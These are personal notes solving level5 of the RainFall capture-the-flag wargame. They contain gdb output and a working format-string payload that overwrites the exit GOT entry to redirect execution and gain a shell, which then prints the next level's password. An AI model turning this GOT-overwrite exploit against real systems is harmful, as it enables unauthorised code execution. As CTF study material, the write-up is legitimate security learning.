ret2plt

GOT PLT exploit -> https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got


```
(gdb) set height 30
(gdb) i func
0x080484a4  o
0x080484c2  n
0x08048504  main
```

n func calls prinft then exit
```
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```


```
level5@RainFall:~$ python -c 'print "AAAA" + " |%p| " * 20 ' | ./level5
AAAA |0x200|  |0xb7fd1ac0|  |0xb7ff37d0|  |0x41414141|

level5@RainFall:~$ python -c 'print "AAAA" + " |%4$x| " ' | ./level5
AAAA |41414141|
```
```
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
 ```
 "[We’re in the PLT, and we see that we’re performing a jmp, but this is not a typical jmp. This is what a jmp to a function pointer would look like. The processor will dereference the pointer, then jump to resulting address.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)"

"Let’s check the dereference and follow the jmp. Note that the pointer is in the .got.plt"

"The PLT resolves actual locations in libc of functions you use and stores them in the GOT"

```
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```



call o from n <===> ovveride exit (0x8049838) of by addr of o (0x080484a4)

(gdb) p 0x080484a4 - 4 = 134513824


 (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n" '; cat) | ./level5
 
 ```
 level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"'; cat -) | ./level5 > /dev/null
cat /home/user/level6/.pass 1>&2
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
 `"%134513824d%4$n"`
 
 Rappel:
``` 
(stdin), fd 0
(stdout),fd 1
(stderr),fd 2

pwd 1>&2, the standard output of the pwd command,
which would normally be printed to the terminal,
is instead redirected to the standard error,
and will be printed to the terminal as an error message.
```







